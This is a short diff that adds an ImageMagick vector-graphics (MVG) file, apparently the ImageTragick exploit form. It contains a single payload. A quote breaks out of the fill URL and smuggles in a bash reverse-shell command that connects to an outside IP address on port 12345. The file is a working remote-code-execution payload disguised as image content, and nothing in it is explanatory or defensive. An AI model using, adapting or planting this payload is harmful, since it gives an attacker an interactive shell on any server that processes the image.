@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/202.102.245.15/12345 0>&1")'
+pop graphic-context
